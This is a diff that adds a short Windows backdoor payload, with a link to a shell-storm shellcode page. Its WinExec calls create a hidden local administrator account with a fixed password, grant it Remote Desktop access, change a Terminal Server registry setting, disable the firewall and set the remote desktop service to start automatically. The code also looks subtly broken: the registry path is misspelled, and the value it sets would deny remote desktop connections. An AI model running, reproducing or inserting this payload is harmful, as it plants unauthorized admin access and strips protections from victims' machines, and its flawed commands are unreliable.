@@ -1,0 +1,9 @@
+http://shell-storm.org/shellcode/files/shellcode-897.php
+
+WinExec("net user ALI ALI /add", 1);
+WinExec("net localgroup Administrators ALI /add", 1);
+WinExec("NET LOCALGROUP \"Remote Desktop Users\" ALI /add", 1);
+WinExec("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f", 1);
+WinExec("netsh firewall set opmode disable", 1);
+WinExec("sc config termservice start= auto", 1);
+ExitProcess(0);
